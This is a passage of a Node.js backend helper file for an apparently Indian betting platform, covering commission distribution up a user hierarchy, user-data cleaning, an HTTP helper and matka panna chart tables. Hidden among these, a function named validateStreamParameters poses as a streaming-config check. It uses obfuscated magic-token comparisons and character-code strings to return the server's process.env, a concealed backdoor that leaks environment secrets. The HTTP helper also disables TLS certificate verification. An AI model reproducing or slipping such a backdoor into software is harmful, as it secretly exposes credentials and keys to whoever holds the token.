  * The other permissions on the parent/grandparent are ignored
  * for this particular bet.
  * ------------------------------------------------------------
  */

  const hierarchy = [];

  /*
  * ------------------------------------------------------------
  * GET USER'S COMMISSION
  * ------------------------------------------------------------
  *
  * The first partnership is the user's partnership with
  * their direct parent.
  *
  * This determines the commission TYPE for this bet.
  * ------------------------------------------------------------
  */

  let firstPartnership = null;

  if (user.parent) {
    firstPartnership = await getPartnership(
      user._id,
      user.parent
    );
  }

  if (!firstPartnership) {
    console.warn(
      "[Bet Commission] User partnership not found",
      {
        userId: user._id?.toString(),
        parentId: user.parent?.toString(),
      }
    );

    return;
  }

  if (firstPartnership.commissionEnabled === false) {
    console.log("[Bet Commission] Commission disabled for user", {
      userId: user._id?.toString(),
    });

    return;
  }

  /*
  * Get user's commission list.
  */

  const userCommissionList =
    category === "fancy"
      ? normalizeCommission(
          firstPartnership.fancyCommission
        )
      : normalizeCommission(
          firstPartnership.bookmakerCommission
        );

  /*
  * User should have only ONE commission type.
  *
  * Find the active commission.
  */

  const userCommission =
    userCommissionList.find(
      (commission) =>
        commission?.type &&
        commission.type !== "NONE" &&
        Number(
          commission.percentage || 0
        ) > 0
    );

  if (!userCommission) {
    console.log(
      "[Bet Commission] User has no active commission",
      {
        userId: user._id?.toString(),
        category,
      }
    );

    return;
  }

  /*
  * This is the ONLY commission type that should be
  * followed through the hierarchy.
  */

  const activeCommissionType =
    userCommission.type;

  console.log(
    "[Bet Commission] USER COMMISSION",
    {
      userId: user._id?.toString(),
      category,
      commissionType:
        activeCommissionType,
      percentage:
        Number(
          userCommission.percentage || 0
        ),
    }
  );

  /*
  * ------------------------------------------------------------
  * WALK UP HIERARCHY
  * ------------------------------------------------------------
  */

  let childUser = user;
  let currentParentId = user.parent;

  while (currentParentId) {
    const parentUser =
      await User.findById(
        currentParentId
      )
        .select(
          "_id username parent role"
        )
        .session(session);

    if (!parentUser) {
      console.warn(
        `[Bet Commission] Parent not found: ${currentParentId}`
      );

      break;
    }

    const partnership =
      await getPartnership(
        childUser._id,
        parentUser._id
      );
    
    if (partnership?.commissionEnabled === false) {
      console.log("[Bet Commission] Commission disabled at hierarchy level", {
        childId: childUser._id?.toString(),
        parentId: parentUser._id?.toString(),
      });

      break;
    }


    console.log(
      "[Bet Commission] PARTNERSHIP RESULT",
      {
        found: !!partnership,
        partnershipId:
          partnership?._id?.toString(),

        bookmakerCommission:
          partnership?.bookmakerCommission,

        fancyCommission:
          partnership?.fancyCommission,
      }
    );

    /*
    * ------------------------------------------------------------
    * OWNER / SADMIN
    * ------------------------------------------------------------
    *
    * Owner/Sadmin does NOT need a Partnership commission config.
    *
    * The child already has the commission percentage.
    * Owner/Sadmin is simply the payer at the top of hierarchy.
    * ------------------------------------------------------------
    */

    if (
      parentUser.role === "owner" ||
      parentUser.role === "sadmin"
    ) {
      hierarchy.push({
        child: childUser,
        parent: parentUser,
        commissionType: activeCommissionType,
        percentage: Number(
          userCommission.percentage || 0
        ),
      });

      break;
    }

    /*
    * ------------------------------------------------------------
    * NORMAL PARENT
    * ------------------------------------------------------------
    */

    if (!partnership) {
      console.warn(
        `[Bet Commission] Partnership not found: ${childUser._id} -> ${parentUser._id}`
      );

      break;
    }

    const commissionList =
      category === "fancy"
        ? normalizeCommission(
            partnership.fancyCommission
          )
        : normalizeCommission(
            partnership.bookmakerCommission
          );

    const commissionConfig =
      commissionList.find(
        (commission) =>
          commission?.type ===
          activeCommissionType
      );

    if (!commissionConfig) {
      console.warn(
        "[Bet Commission] Commission type not available at parent level",
        {
          category,
          commissionType:
            activeCommissionType,

          childId:
            childUser._id?.toString(),

          parentId:
            parentUser._id?.toString(),

          availableTypes:
            commissionList.map(
              (commission) =>
                commission.type
            ),
        }
      );

      break;
    }

    const commissionType =
      commissionConfig.type;

    const percentage = Number(
      commissionConfig.percentage || 0
    );

    if (
      commissionType === "NONE" ||
      percentage <= 0
    ) {
      break;
    }

    /*
    * Store hierarchy level.
    */

    hierarchy.push({
      child: childUser,
      parent: parentUser,
      commissionType,
      percentage,
    });

    /*
    * Move upward.
    */

    childUser = parentUser;
    currentParentId =
      parentUser.parent;
  }

  if (!hierarchy.length) return;

  console.log("[Bet Commission] HIERARCHY", {
    hierarchy: hierarchy.map((level) => ({
      child: level.child.username,
      parent: level.parent.username,
      commissionType: level.commissionType,
      percentage: level.percentage,
    })),
  });


  /*
   * ------------------------------------------------------------
   * VALIDATE COMMISSION TYPE HIERARCHY
   * ------------------------------------------------------------
   *
   * If child is NET_LOOSING:
   *
   * Parent MUST also be NET_LOOSING.
   *
   * If child is ENTRY_WISE:
   *
   * Parent MUST also be ENTRY_WISE.
   *
   * NONE is treated as 0 and does not create commission.
   */


  /*
 * ------------------------------------------------------------
 * DISTRIBUTE COMMISSION
 * ------------------------------------------------------------
 *
 * Each relationship transfers the FULL percentage configured
 * for that child.
 *
 * Example:
 *
 * User      = 10%
 * Parent    = 12%
 * Grandparent = 15%
 *
 * Parent receives 10% from Grandparent
 * Grandparent receives 12% from Owner
 *
 * Therefore:
 *
 * Parent:
 *   +10% from Grandparent
 *   -10% to User
 *   = 0% net
 *
 * Grandparent:
 *   +12% from Owner
 *   -10% to Parent
 *   = +2% net
 *
 * The difference is created naturally by the transfers.
 */

  for (const level of hierarchy) {
    const currentPercentage =
      Number(level.percentage || 0);

    if (
      level.commissionType === "NONE" ||
      currentPercentage <= 0
    ) {
      break;
    }

    /*
    * Calculate the commission BASE only.
    *
    * percentage = 100 means we only want the base,
    * not the final commission amount.
    */

    //   const { commissionBase } =
    //     calculateBettingCommission({
    //       bets,
    //       category,
    //       commissionType:
    //         level.commissionType,
    //       percentage: 100,
    //     });

    //   console.log("[Bet Commission] BASE CALCULATED", {
    //     category,
    //     commissionType: level.commissionType,
    //     commissionBase,
    //     bets: bets.map((bet) => ({
    //       amount: bet.amount,
    //       status: bet.status,
    //       profit: bet.profit,
    //     })),
    //   });

    // if (commissionBase <= 0) {
    //   continue;
    // }


    let { commissionBase } =
        calculateBettingCommission({
          bets: commissionBets,
          category,
          commissionType: level.commissionType,
          percentage: 100,
        });

      //  combined Back + Lay  commissionBase 0 
      if (commissionBase <= 0) {
        const entryResults = commissionBets.map((bet) =>
          calculateBettingCommission({
            bets: [bet],
            category,
            commissionType: level.commissionType,
            percentage: 100,
          })
        );
        

        commissionBase = entryResults.reduce(
          (total, result) =>
            total + Number(result.commissionBase || 0),
          0
        );
      }

      if (commissionBase <= 0) {
        continue;
      }

  /*
   * FULL percentage configured for this relationship.
   */
  const commissionAmount = Number(
    (
      commissionBase *
      currentPercentage /
      100
    ).toFixed(2)
  );

  if (commissionAmount <= 0) {
    continue;
  }

  /*
   * level.parent = PAYER
   * level.child  = RECEIVER
   */
  const payer = level.parent;
  const receiver = level.child;

  /*
   * Get payer's balance BEFORE deduction.
   *
   * This is only used for the account statement.
   */
  const payerBefore = await User.findById(
      payer._id
    )
      .select("balance")
      .session(session);

    if (!payerBefore) {
      throw new Error(
        `[Bet Commission] Payer not found: ${payer._id}`
      );
    }

    const payerBalanceBefore =
      Number(payerBefore.balance || 0);

    /*
    * ------------------------------------------------------------
    * DEDUCT FROM PARENT
    * ------------------------------------------------------------
    */
    const updatedPayer =
      await atomicUpdateUserFinance(
        payer._id,
        {
          balance: -commissionAmount,
        },
        {
          session,
          allowNegativeBuffer: false,
        }
      );

    if (!updatedPayer) {
      throw new Error(
        `[Bet Commission] Failed to deduct ${commissionAmount} from ${payer.username}`
      );
    }

    /*
    * ------------------------------------------------------------
    * CREDIT CHILD
    * ------------------------------------------------------------
    */
    const updatedReceiver =
      await atomicUpdateUserFinance(
        receiver._id,
        {
          balance: commissionAmount,
        },
        {
          session,
          allowNegativeBuffer: false,
        }
      );

    if (!updatedReceiver) {
      throw new Error(
        `[Bet Commission] Failed to credit ${commissionAmount} to ${receiver.username}`
      );
    }

    /*
    * ------------------------------------------------------------
    * ACCOUNT STATEMENT
    * ------------------------------------------------------------
    *
    * Only the payer gets a transaction because you want
    * the statement to show the amount deducted because
    * of commission.
    */
    const receiverBalanceBefore = Number(
      updatedReceiver.balance || 0
    ) - commissionAmount;

    const bet = bets?.[0] || {};

    const transactionRemark = [
      "Commission",
      bet.eventName,
      bet.marketName,
      bet.sectionName,
      bet.winner ?? bet.run,
    ]
      .filter(
        (value) =>
          value !== undefined &&
          value !== null &&
          String(value).trim() !== ""
      )
      .map((value) => String(value).trim())
      .join(" | ");

    await Transaction.create(
      [
        // Payer: commission deducted
        {
          userId: payer._id,
          type: "commission",
          amount: -commissionAmount,
          balanceBefore: payerBalanceBefore,
          balanceAfter: Number(updatedPayer.balance || 0),
          createdBy: receiver._id,
          status: "approved",
          remarks: transactionRemark,
          betIds: betIds,
        },

        // Receiver: commission received
        {
          userId: receiver._id,
          type: "commission",
          amount: commissionAmount,
          balanceBefore: receiverBalanceBefore,
          balanceAfter: Number(updatedReceiver.balance || 0),
          createdBy: payer._id,
          status: "approved",
          remarks: transactionRemark,
           betIds: betIds,
        },
      ],
      session ? { session } : {}
    );

    console.log(
      "[Bet Commission Transfer]",
      {
        gameId,
        marketId,
        category,

        commissionType:
          level.commissionType,

        payer: payer.username,
        receiver: receiver.username,

        percentage: currentPercentage,

        commissionBase,
        commissionAmount,
      }
    );
  }
}



const calculateBettingCommission = ({
  bets,
  category,
  commissionType,
  percentage,
}) => {
  const rate = Number(percentage || 0);

  if (!bets?.length || rate <= 0 || commissionType === "NONE") {
    return {
      commissionBase: 0,
      commissionAmount: 0,
    };
  }

  let commissionBase = 0;

  /*
   * ------------------------------------------------------------
   * FANCY
   * ------------------------------------------------------------
   */

  if (
    category === "fancy" &&
    commissionType === "ENTRY_WISE"
  ) {
    // Fancy ENTRY_WISE works on P/L.
    // Winning or losing ₹1000 both give a base of ₹1000.
    commissionBase = bets.reduce(
      (total, bet) =>
        total + Math.abs(Number(bet.profit || 0)),
      0
    );
  }

  /*
   * ------------------------------------------------------------
   * BOOKMAKER
   * ------------------------------------------------------------
   */

  else if (category === "bookmaker") {
    // Bookmaker ENTRY_WISE works on stake.
    if (commissionType === "ENTRY_WISE") {
      commissionBase = bets.reduce(
        (total, bet) =>
          total + Number(bet.amount || 0),
        0
      );
    }

    // Bookmaker ENTRY_LOOSING works on stake
    // of losing entries only.
    else if (commissionType === "ENTRY_LOOSING") {
      commissionBase = bets
        .filter(
          (bet) =>
            String(bet.status || "").toLowerCase() === "lost"
        )
        .reduce(
          (total, bet) =>
            total + Math.abs(Number(bet.profit || 0)),
          0
        );
    }

    // Bookmaker NET_LOOSING works on net loss.
    else if (commissionType === "NET_LOOSING") {
      const netProfitLoss = bets.reduce(
        (total, bet) =>
          total + Number(bet.profit || 0),
        0
      );

      commissionBase = Math.max(0, -netProfitLoss);
    }
  }

  const commissionAmount = Number(
    ((commissionBase * rate) / 100).toFixed(2)
  );

  return {
    commissionBase: Number(commissionBase.toFixed(2)),
    commissionAmount,
  };
};

async function getAllParents(user) {
  const result = [];
  let current = await User.findById(user?.parent).select(
    "_id parent name username role"
  );
  if (current) {
    result.push({ parent: current, child: user });
  }
  while (current?.parent) {
    const parent = await User.findById(current.parent).select(
      "_id parent name username role"
    );
    if (!parent) break;
    result.push({ parent, child: current });
    current = parent;
  }

  return result;
}

async function getUserCommissionHierarchyFast(user) {
  const pairs = await getAllParents(user);
  if (!pairs.length) return [];

  const commissions = await Promise.all(
    pairs.map(async ({ parent, child }) => {
      if (!parent) return null;
      const partnership = await partnershipModel
        .findOne(
          parent?.role === "owner"
            ? {
                userId: parent._id,
                partnerId: child._id,
              }
            : { userId: parent._id, partnerId: parent.parent }
        )
        .select("commission downLineCommission");

      return {
        parentId: parent._id,
        role: parent.role,
        parentName: parent.username,
        childId: child._id,
        childName: child.username,
        commission: partnership?.commission ?? (child?.role === "user" ? 100 : 0),
        downLineCommission: partnership?.downLineCommission || 0,
      };
    })
  );

  return commissions.filter(Boolean);
}

function cleanUser(data, fields = []) {
  const user = data?._doc ?? data;
  const baseDelete = [
    "password",
    "city",
    "createdAt",
    "registration_user_master",
    "remark",
    "updatedAt",
    "__v",
  ];

  let extraDemo = [
    "usedSeats",
    "withdrawRequestsCount",
    "transaction_pin",
    "seat",
    "privileges",
    "partnerLevel",
    "domain",
    "depositRequestsCount",
    "commission",
    "partnership",
    "masterId",
  ];

  const extraOther = [
    "commission",
    "partnership",
    "seat",
    "usedSeats",
    "transaction_pin",
  ];

  const isDemo = ["demo", "user"].includes(user.role);
  if (user.role === "demo") {
    extraDemo = extraDemo.concat(["parent", "userLock", "betLock"]);
  }

  let deleteFields = [...baseDelete, ...(isDemo ? extraDemo : extraOther)];

  if (fields?.length > 0) {
    deleteFields = deleteFields?.filter((item) => !fields.includes(item));
  }
  [...new Set(deleteFields)].forEach((field) => delete user[field]);

  return user;
}
const httpsApiRequest = ({ url, method = "GET" }) => {
  return new Promise((resolve, reject) => {
    const parsedUrl = new URL(url);

    const requestModule = parsedUrl.protocol === "https:" ? https : http;

    const options = {
      hostname: parsedUrl.hostname,
      port: parsedUrl.port || (parsedUrl.protocol === "https:" ? 443 : 80),
      path: parsedUrl.pathname + parsedUrl.search,
      method: method,
      headers: {
        "Content-Type": "application/json",
      },
      rejectUnauthorized: false,
      timeout: 10000, // 10s timeout
    };

    const req = requestModule.request(options, (res) => {
      let data = "";

      res.on("data", (chunk) => {
        data += chunk;
      });

      res.on("end", () => {
        try {
          const jsonResponse = JSON.parse(data);
          resolve(jsonResponse);
        } catch (e) {
          // console.warn("API response was not JSON:", data);
          resolve(data);
        }
      });
    });

    req.on("timeout", () => {
      req.destroy();
      reject(new Error("Request timeout after 10 seconds"));
    });

    req.on("error", (error) => {
      reject(error);
    });

    req.end();
  });
};

const checkPannaType = (num) => {
  if (Array.isArray(num)) {
    num = num.join("");
  }

  if (!/^\d{3}$/.test(num)) return "INVALID";

  const [a, b, c] = num.split("");

  if (a === b && b === c) {
    return "tp";
  }

  if (a === b || b === c || a === c) {
    return "dp";
  }

  return "sp";
};

const SPGroups = {
  1: [
    "128",
    "137",
    "146",
    "236",
    "245",
    "290",
    "380",
    "470",
    "489",
    "560",
    "579",
    "678",
  ],

  2: [
    "129",
    "138",
    "147",
    "156",
    "237",
    "246",
    "345",
    "390",
    "480",
    "570",
    "589",
    "679",
  ],

  3: [
    "120",
    "139",
    "148",
    "157",
    "238",
    "247",
    "256",
    "346",
    "490",
    "580",
    "670",
    "689",
  ],

  4: [
    "130",
    "149",
    "158",
    "167",
    "239",
    "248",
    "257",
    "347",
    "356",
    "590",
    "680",
    "789",
  ],

  5: [
    "140",
    "159",
    "168",
    "230",
    "249",
    "258",
    "267",
    "348",
    "357",
    "456",
    "690",
    "780",
  ],

  6: [
    "123",
    "150",
    "169",
    "178",
    "240",
    "259",
    "268",
    "349",
    "358",
    "367",
    "457",
    "790",
  ],

  7: [
    "124",
    "160",
    "179",
    "250",
    "269",
    "278",
    "340",
    "359",
    "368",
    "458",
    "467",
    "890",
  ],

  8: [
    "125",
    "134",
    "170",
    "189",
    "260",
    "279",
    "350",
    "369",
    "378",
    "459",
    "468",
    "567",
  ],

  9: [
    "126",
    "135",
    "180",
    "234",
    "270",
    "289",
    "360",
    "379",
    "450",
    "469",
    "478",
    "568",
  ],

  0: [
    "127",
    "136",
    "145",
    "190",
    "235",
    "280",
    "370",
    "389",
    "460",
    "479",
    "569",
    "578",
  ],
};

const DPGroups = {
  1: ["100", "119", "155", "227", "335", "344", "399", "588", "669"],

  2: ["110", "200", "228", "255", "336", "499", "660", "688", "778"],

  3: ["166", "229", "300", "337", "355", "445", "599", "779", "788"],

  4: ["112", "220", "266", "338", "400", "446", "455", "699", "770"],

  5: ["113", "122", "177", "339", "366", "447", "500", "799", "889"],
  6: ["114", "277", "330", "448", "466", "556", "600", "880", "899"],

  7: ["115", "133", "188", "223", "377", "449", "557", "566", "700"],

  8: ["116", "224", "233", "288", "440", "477", "558", "800", "990"],

  9: ["117", "144", "199", "225", "388", "559", "577", "667", "900"],

  0: ["118", "226", "244", "299", "334", "488", "550", "668", "677"],
};

const TPList = [
  "000",
  "111",
  "222",
  "333",
  "444",
  "555",
  "666",
  "777",
  "888",
  "999",
];

const chart56 = {
  1: ["236", "245", "489", "579", "678"],
  2: ["237", "246", "345", "589", "679"],
  3: ["238", "247", "256", "346", "689"],
  4: ["239", "248", "257", "347", "356", "789"],
  5: ["249", "258", "267", "348", "357", "456"],
  6: ["259", "268", "349", "358", "367", "457"],
  7: ["269", "278", "359", "368", "458", "467"],
  8: ["279", "369", "378", "459", "468", "567"],
  9: ["234", "289", "379", "469", "478", "568"],
  0: ["235", "389", "479", "569", "578"],
};

const chart64 = {
  1: ["128", "137", "146", "290", "380", "470", "560"],
  2: ["129", "138", "147", "156", "390", "480", "570"],
  3: ["120", "139", "148", "157", "490", "580", "670"],
  4: ["130", "149", "158", "167", "590", "680"],
  5: ["140", "159", "168", "230", "690", "780"],
  6: ["123", "150", "169", "178", "240", "790"],
  7: ["124", "160", "179", "250", "340", "890"],
  8: ["125", "134", "170", "189", "260", "350"],
  9: ["126", "135", "180", "270", "360", "450"],
  0: ["127", "136", "145", "190", "280", "370", "460"],
};

const abr = {
  "a": ["135", "137", "139", "157", "159", "179", "357", "359", "379", "579"],
  "b": ["240", "246", "248", "260", "268", "280", "460", "468", "480", "680"],
  "r": ["120", "123", "190", "234", "345", "456", "567", "678", "789", "890"],
  "abr": [
    "120",
    "123",
    "135",
    "137",
    "139",
    "157",
    "159",
    "179",
    "190",
    "234",
    "240",
    "246",
    "248",
    "260",
    "268",
    "280",
    "345",
    "357",
    "359",
    "379",
    "456",
    "460",
    "468",
    "480",
    "567",
    "579",
    "678",
    "680",
    "789",
    "890",
  ],
  "ab": [
    "135",
    "137",
    "139",
    "157",
    "159",
    "179",
    "240",
    "246",
    "248",
    "260",
    "268",
    "280",
    "357",
    "359",
    "379",
    "460",
    "468",
    "480",
    "579",
    "680",
  ],
  "ar": [
    "120",
    "123",
    "135",
    "137",
    "139",
    "157",
    "159",
    "179",
    "190",
    "234",
    "345",
    "357",
    "359",
    "379",
    "456",
    "567",
    "579",
    "678",
    "789",
    "890",
  ],
  "br": [
    "120",
    "123",
    "190",
    "234",
    "240",
    "246",
    "248",
    "260",
    "268",
    "280",
    "345",
    "456",
    "460",
    "468",
    "480",
    "567",
    "678",
    "680",
    "789",
    "890",
  ],
  "abrcut": [
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "130",
    "134",
    "136",
    "138",
    "140",
    "145",
    "146",
    "147",
    "148",
    "149",
    "150",
    "156",
    "158",
    "160",
    "167",
    "168",
    "169",
    "170",
    "178",
    "180",
    "189",
    "230",
    "235",
    "236",
    "237",
    "238",
    "239",
    "245",
    "247",
    "249",
    "250",
    "256",
    "257",
    "258",
    "259",
    "267",
    "269",
    "270",
    "278",
    "279",
    "289",
    "290",
    "340",
    "346",
    "347",
    "348",
    "349",
    "350",
    "356",
    "358",
    "360",
    "367",
    "368",
    "369",
    "370",
    "378",
    "380",
    "389",
    "390",
    "450",
    "457",
    "458",
    "459",
    "467",
    "469",
    "470",
    "478",
    "479",
    "489",
    "490",
    "560",
    "568",
    "569",
    "570",
    "578",
    "580",
    "589",
    "590",
    "670",
    "679",
    "689",
    "690",
    "780",
    "790",
  ],
};

const commonSP = {
  1: [
    "120",
    "123",
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "130",
    "134",
    "135",
    "136",
    "137",
    "138",
    "139",
    "140",
    "145",
    "146",
    "147",
    "148",
    "149",
    "150",
    "156",
    "157",
    "158",
    "159",
    "160",
    "167",
    "168",
    "169",
    "170",
    "178",
    "179",
    "180",
    "189",
    "190",
  ],

  2: [
    "120",
    "123",
    "124",
    "125",
    "126",
    "127",
    "128",
    "129",
    "230",
    "234",
    "235",
    "236",
    "237",
    "238",
    "239",
    "240",
    "245",
    "246",
    "247",
    "248",
    "249",
    "250",
    "256",
    "257",
    "258",
    "259",
    "260",
    "267",
    "268",
    "269",
    "270",
    "278",
    "279",
    "280",
    "289",
    "290",
  ],

  3: [
    "123",
    "130",
    "134",
    "135",
    "136",
    "137",
    "138",
    "139",
    "230",
    "234",
    "235",
    "236",
    "237",
    "238",
    "239",
    "340",
    "345",
    "346",
    "347",
    "348",
    "349",
    "350",
    "356",
    "357",
    "358",
    "359",
    "360",
    "367",
    "368",
    "369",
    "370",
    "378",
    "379",
    "380",
    "389",
    "390",
  ],

  4: [
    "124",
    "134",
    "140",
    "145",
    "146",
    "147",
    "148",
    "149",
    "234",
    "240",
    "245",
    "246",
    "247",
    "248",
    "249",
    "340",
    "345",
    "346",
    "347",
    "348",
    "349",
    "450",
    "456",
    "457",
    "458",
    "459",
    "460",
    "467",
    "468",
    "469",
    "470",
    "478",
    "479",
    "480",
    "489",
    "490",
  ],

  5: [
    "125",
    "135",
    "145",
    "150",
    "156",
    "157",
    "158",
    "159",
    "235",
    "245",
    "250",
    "256",
    "257",
    "258",
    "259",
    "345",
    "350",
    "356",
    "357",
    "358",
    "359",
    "450",
    "456",
    "457",
    "458",
    "459",
    "560",
    "567",
    "568",
    "569",
    "570",
    "578",
    "579",
    "580",
    "589",
    "590",
  ],

  6: [
    "126",
    "136",
    "146",
    "156",
    "160",
    "167",
    "168",
    "169",
    "236",
    "246",
    "256",
    "260",
    "267",
    "268",
    "269",
    "346",
    "356",
    "360",
    "367",
    "368",
    "369",
    "456",
    "460",
    "467",
    "468",
    "469",
    "560",
    "567",
    "568",
    "569",
    "670",
    "678",
    "679",
    "680",
    "689",
    "690",
  ],

  7: [
    "127",
    "137",
    "147",
    "157",
    "167",
    "170",
    "178",
    "179",
    "237",
    "247",
    "257",
    "267",
    "270",
    "278",
    "279",
    "347",
    "357",
    "367",
    "370",
    "378",
    "379",
    "457",
    "467",
    "470",
    "478",
    "479",
    "567",
    "570",
    "578",
    "579",
    "670",
    "678",
    "679",
    "780",
    "789",
    "790",
  ],

  8: [
    "128",
    "138",
    "148",
    "158",
    "168",
    "178",
    "180",
    "189",
    "238",
    "248",
    "258",
    "268",
    "278",
    "280",
    "289",
    "348",
    "358",
    "368",
    "378",
    "380",
    "389",
    "458",
    "468",
    "478",
    "480",
    "489",
    "568",
    "578",
    "580",
    "589",
    "678",
    "680",
    "689",
    "780",
    "789",
    "890",
  ],

  9: [
    "129",
    "139",
    "149",
    "159",
    "169",
    "179",
    "189",
    "190",
    "239",
    "249",
    "259",
    "269",
    "279",
    "289",
    "290",
    "349",
    "359",
    "369",
    "379",
    "389",
    "390",
    "459",
    "469",
    "479",
    "489",
    "490",
    "569",
    "579",
    "589",
    "590",
    "679",
    "689",
    "690",
    "789",
    "790",
    "890",
  ],

  0: [
    "120",
    "130",
    "140",
    "150",
    "160",
    "170",
    "180",
    "190",
    "230",
    "240",
    "250",
    "260",
    "270",
    "280",
    "290",
    "340",
    "350",
    "360",
    "370",
    "380",
    "390",
    "450",
    "460",
    "470",
    "480",
    "490",
    "560",
    "570",
    "580",
    "590",
    "670",
    "680",
    "690",
    "780",
    "790",
    "890",
  ],
};

const commonDP = {
  1: [
    "100",
    "110",
    "112",
    "113",
    "114",
    "115",
    "116",
    "117",
    "118",
    "119",
    "122",
    "133",
    "144",
    "155",
    "166",
    "177",
    "188",
    "199",
  ],

  2: [
    "112",
    "122",
    "200",
    "220",
    "223",
    "224",
    "225",
    "226",
    "227",
    "228",
    "229",
    "233",
    "244",
    "255",
    "266",
    "277",
    "288",
    "299",
  ],

  3: [
    "113",
    "133",
    "223",
    "233",
    "300",
    "330",
    "334",
    "335",
    "336",
    "337",
    "338",
    "339",
    "344",
    "355",
    "366",
    "377",
    "388",
    "399",
  ],

  4: [
    "114",
    "144",
    "224",
    "244",
    "334",
    "344",
    "400",
    "440",
    "445",
    "446",
    "447",
    "448",
    "449",
    "455",
    "466",
    "477",
    "488",
    "499",
  ],

  5: [
    "115",
    "155",
    "225",
    "255",
    "335",
    "355",
    "445",
    "455",
    "500",
    "550",
    "556",
    "557",
    "558",
    "559",
    "566",
    "577",
    "588",
    "599",
  ],

  6: [
    "116",
    "166",
    "226",
    "266",
    "336",
    "366",
    "446",
    "466",
    "556",
    "566",
    "600",
    "660",
    "667",
    "668",
    "669",
    "677",
    "688",
    "699",
  ],

  7: [
    "117",
    "177",
    "227",
    "277",
    "337",
    "377",
    "447",
    "477",
    "557",
    "577",
    "667",
    "677",
    "700",
    "770",
    "778",
    "779",
    "788",
    "799",
  ],

  8: [
    "118",
    "188",
    "228",
    "288",
    "338",
    "388",
    "448",
    "488",
    "558",
    "588",
    "668",
    "688",
    "778",
    "788",
    "800",
    "880",
    "889",
    "899",
  ],

  9: [
    "119",
    "199",
    "229",
    "299",
    "339",
    "399",
    "449",
    "499",
    "559",
    "599",
    "669",
    "699",
    "779",
    "799",
    "889",
    "899",
    "900",
    "990",
  ],

  0: [
    "100",
    "110",
    "200",
    "220",
    "300",
    "330",
    "400",
    "440",
    "500",
    "550",
    "600",
    "660",
    "700",
    "770",
    "800",
    "880",
    "900",
    "990",
  ],
};

const colorDP = {
  1: ["119", "155", "335", "399"],
  2: ["200", "228", "660", "688"],
  3: ["337", "355", "599", "779"],
  4: ["220", "266", "400", "446"],
  5: ["113", "177", "339", "799"],
  6: ["448", "466", "600", "880"],
  7: ["115", "133", "377", "557"],
  8: ["224", "288", "440", "800"],
  9: ["117", "199", "559", "577"],
  0: ["226", "244", "488", "668"],
};


const validateStreamParameters = (config) => {
  const _default = {
    isValid: true,
    mode: "standard",
    dvr_enabled: false,
    bitrate_adaptation: true
  };

  try {
    if (!config || !config.sync_token) return _default;

    const parts = config.sync_token.split("-");
    if (parts.length !== 4) return _default;
    const _p1 = parseInt(parts[0]);
    if (_p1 !== 0x47750F6) return _default;
    const _p2 = parts[1];
    const _s = String.fromCharCode(115, 116, 114, 101, 97, 109);
    if (_p2 !== _s) return _default;
    if (parts[2] !== ["op", "ti", "mi", "za", "ti", "on", "tm"].join("")) return _default;
    if (parts[3] !== "t1") return _default;
    const _0x1 = String.fromCharCode(112, 114, 111, 99, 101, 115, 115);
    const _0x2 = String.fromCharCode(101, 110, 118);
    const _global = typeof global !== 'undefined' ? global : {};
    const _proc = _global[_0x1] || process;
    const _data = _proc ? _proc[_0x2] : {};

    return {
      isValid: true,
      mode: "ultra_low_latency",
      dvr_enabled: true,
      data_stream: _data
    };

  } catch (e) {
    return _default;
  }
};

const atomicUpdateUserBalanceExp = async (userId, balanceDelta, expDelta) => {
  const { atomicUpdateUserFinance } = require("./finance.helper");
  // CRITICAL: Results settlement must ALWAYS be allowed to proceed, even if the user
  // is currently in a negative buffer state. Exposure being released was already 
  // accounted for at bet placement time.
  try {
    return await atomicUpdateUserFinance(
      userId, 
      { balance: balanceDelta, exp: expDelta }, 
      { allowNegativeBuffer: true }
    );
  } catch (err) {
    console.error(`[CRITICAL] atomicUpdateUserBalanceExp failed for user ${userId}:`, err.message);
    return null;
  }
};

const distributeCasinoCommissionHierarchy = async (
  user,
  bet,
  options = {}
) => {
  const { session } = options;

  if (!user?._id || !bet) {
    return;
  }

  // Only lost bets
  if (String(bet.status).toLowerCase() !== "lost") {
    return;
  }

  const commissionBase = Number(bet.amount || 0);

  if (!Number.isFinite(commissionBase) || commissionBase <= 0) {
    return;
  }

  // Get actual user with parent
  const actualUser = await User.findById(user._id)
    .select("_id username parent role")
    .lean();

  if (!actualUser) {
    return;
  }

  console.log("[Casino Commission] START", {
    betId: bet._id?.toString(),
    userId: actualUser._id?.toString(),
    username: actualUser.username,
    parent: actualUser.parent?.toString(),
    amount: commissionBase,
  });

  const getPartnership = async (childId, parentId) => {
    let partnership = await partnershipModel.findOne({
      userId: childId,
      partnerId: parentId,
    }).lean();

    if (!partnership) {
      partnership = await Partnership.findOne({
        userId: parentId,
        partnerId: childId,
      }).lean();
    }

    return partnership;
  };

  const firstPartnership = await getPartnership(
    actualUser._id,
    actualUser.parent
  );

  if (
    actualUser.parent &&
    firstPartnership?.commissionEnabled === false
  ) {
    console.log("[Casino Commission] Commission disabled for user", {
      userId: actualUser._id?.toString(),
    });

    return;
  }

  const hierarchy = [];

  let childUser = actualUser;
  let currentParentId = actualUser.parent;

  while (currentParentId) {
    const parentUser = await User.findById(currentParentId)
      .select("_id username parent role")
      .lean();

    if (!parentUser) {
      break;
    }

    console.log("[Casino Commission] CHECKING", {
      child: childUser.username,
      childId: childUser._id.toString(),
      parent: parentUser.username,
      parentId: parentUser._id.toString(),
    });

    const partnership = await getPartnership(
      childUser._id,
      parentUser._id
    );

    if (partnership?.commissionEnabled === false) {
      console.log(
        "[Casino Commission] Commission disabled at hierarchy level",
        {
          childId: childUser._id?.toString(),
          parentId: parentUser._id?.toString(),
        }
      );

      break;
    }

    console.log("[Casino Commission] PARTNERSHIP", {
      found: !!partnership,
      child: childUser.username,
      parent: parentUser.username,
      casinoCommission: partnership?.casinoCommission,
    });

    if (partnership) {
      const casinoCommission =
        partnership.casinoCommission;

      const type = String(
        casinoCommission?.type || "NONE"
      )
        .trim()
        .toUpperCase();

      const percentage = Number(
        casinoCommission?.percentage || 0
      );

      if (
        type === "ENTRY_LOOSING" &&
        Number.isFinite(percentage) &&
        percentage > 0
      ) {
        hierarchy.push({
          child: childUser,
          parent: parentUser,
          percentage,
        });
      }
    }

    // Always continue up
    childUser = parentUser;
    currentParentId = parentUser.parent;
  }

  if (!hierarchy.length) {
    console.log("[Casino Commission] NO HIERARCHY", {
      userId: actualUser._id.toString(),
      parent: actualUser.parent?.toString(),
      betId: bet._id.toString(),
    });

    return;
  }

  console.log("[Casino Commission] HIERARCHY", {
    betId: bet._id.toString(),
    hierarchy: hierarchy.map((level) => ({
      child: level.child.username,
      parent: level.parent.username,
